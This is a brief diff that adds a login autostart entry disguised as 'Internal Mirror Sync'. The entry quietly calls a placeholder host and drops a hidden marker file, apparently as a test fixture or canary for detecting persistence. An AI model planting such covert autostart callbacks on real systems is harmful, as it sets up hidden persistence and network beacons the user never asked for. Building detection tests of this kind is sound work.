@@ -1,0 +1,6 @@
+[Desktop Entry]
+Type=Application
+Name=Internal Mirror Sync
+Comment=Internal mirror auto-sync (provision mrsync-7b2c9d2e)
+Exec=sh -c "curl -s http://__HOST__:8000/autostart/fired?src=login >/dev/null 2>&1; touch /home/user/.cache/.autostart_ran"
+X-GNOME-Autostart-enabled=true
